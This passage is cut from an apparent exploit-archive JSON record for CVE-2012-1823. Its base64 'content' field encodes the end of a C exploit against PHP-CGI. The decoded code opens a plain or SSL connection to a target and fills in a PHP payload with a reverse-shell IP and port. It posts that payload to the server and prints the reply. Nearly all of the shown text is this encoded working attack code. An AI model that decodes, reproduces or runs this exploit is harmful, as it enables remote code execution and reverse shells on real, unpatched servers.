ZiAoaHR0cHNmbGFnKSB7DQogICAgc3NsY29ubmVjdGlvbiA9IChjb25uZWN0aW9uKikgbWFsbG9jKHNpemVvZihjb25uZWN0aW9uKSk7DQogICAgaWYgKCFzc2xjb25uZWN0aW9uKSB7DQogICAgIHByaW50ZigibWFsbG9jIGVycm9yICgxMClcbiIpOw0KICAgICBleGl0KDI1NSk7ICAgDQogICAgfQ0KICAgIHNzbGNvbm5lY3Rpb24tPmhhbmRsZSA9IE5VTEw7DQogICAgc3NsY29ubmVjdGlvbi0+Y3R4ID0gTlVMTDsNCg0KICAgIFNTTF9saWJyYXJ5X2luaXQoKTsNCg0KICAgIHNzbGNvbm5lY3Rpb24tPmN0eCA9IFNTTF9DVFhfbmV3KFNTTHYyM19jbGllbnRfbWV0aG9kKCkpOw0KICAgIGlmICghc3NsY29ubmVjdGlvbi0+Y3R4KSB7DQogCSBwcmludGYoIlNTTF9DVFhfbmV3IGVycm9yICgxMSlcbiIpOw0KICAgICBleGl0KDI1NSk7DQogICAgfQ0KDQogICAgc3NsY29ubmVjdGlvbi0+aGFuZGxlID0gU1NMX25ldyhzc2xjb25uZWN0aW9uLT5jdHgpOw0KICAgIGlmICghc3NsY29ubmVjdGlvbi0+aGFuZGxlKSB7DQogCSBwcmludGYoIlNTTF9uZXcgZXJyb3IgKDEyKVxuIik7DQoJIGV4aXQoMjU1KTsgICANCiAgICB9DQogICAgaWYgKCFTU0xfc2V0X2ZkKHNzbGNvbm5lY3Rpb24tPmhhbmRsZSwgc29ja2ZkKSkgew0KIAkgcHJpbnRmKCJTU0xfc2V0X2ZkIGVycm9yICgxMylcbiIpOw0KICAgICBleGl0KDI1NSk7DQogICAgfQ0KICAgDQogICAgaWYgKFNTTF9jb25uZWN0KHNzbGNvbm5lY3Rpb24tPmhhbmRsZSkgIT0gMSkgew0KCSBwcmludGYoIlNTTF9jb25uZWN0IGVycm9yICgxNClcbiIpOw0KICAgICBleGl0KDI1NSk7ICAgICAgIA0KICAgIH0NCiAgIH0NCiAgDQogICB0bXBzaXplID0gc3RybGVuKHBocHN0cikgKyBzdHJsZW4ocmV2ZXJzZWlwKSArIHN0cmxlbihyZXZlcnNlcG9ydHN0cikgKyA2NDsNCiAgIHRtcHN0ciA9IChjaGFyKiljYWxsb2ModG1wc2l6ZSwgc2l6ZW9mKGNoYXIpKTsNCiAgIHNucHJpbnRmKHRtcHN0ciwgdG1wc2l6ZSwgcGhwc3RyLCByZXZlcnNlaXAsIHJldmVyc2Vwb3J0KTsNCiAgIA0KICAgd3JpdGVzaXplID0gc3RybGVuKHRhcmdldCkgKyBzdHJsZW4oaW50ZXJwcmV0ZXIpICsgDQogICAgIHN0cmxlbihwb3N0c3RyKSArIHN0cmxlbih0bXBzdHIpICsgNjQ7DQogICB3cml0ZXN0ciA9IChjaGFyKiljYWxsb2Mod3JpdGVzaXplLCBzaXplb2YoY2hhcikpOw0KICAgc25wcmludGYod3JpdGVzdHIsIHdyaXRlc2l6ZSwgcG9zdHN0ciwgaW50ZXJwcmV0ZXIsDQogICAgIHRhcmdldCwgc3RybGVuKHRtcHN0ciksIHRtcHN0cik7DQogIA0KICAgaWYgKCFodHRwc2ZsYWcpIHsNCgkgd3JpdGUoc29ja2ZkLCB3cml0ZXN0ciwgc3RybGVuKHdyaXRlc3RyKSk7DQoJIHJlYWRidWYgPSByZWFkXyhzb2NrZmQpOw0KICAgfSBlbHNlIHsNCgkgU1NMX3dyaXRlKHNzbGNvbm5lY3Rpb24tPmhhbmRsZSwgd3JpdGVzdHIsIHN0cmxlbih3cml0ZXN0cikpOw0KCSByZWFkYnVmID0gc3NscmVhZChzc2xjb25uZWN0aW9uKTsNCiAgIH0NCiAgDQogICBpZiAocmVhZGJ1Zikgew0KICAgICBwcmludGYoIioqKlNFUlZFUiBSRVNQT05TRSoqKlxuXG4lc1xuXG4iLCByZWFkYnVmKTsgIA0KICAgfSBlbHNlIHsNCiAgICBwcmludGYoInJlYWQgZXJyb3IgKDE1KVxuIik7DQogICAgZXhpdCgyNTUpOwkgIA0KICAgfQ0KICB9DQogIGV4aXQoMSk7DQp9", 
    "filename": "platforms/php/remote/29290.c", 
    "id": "29290", 
    "cves": [
        "CVE-2012-1823"
    ]
}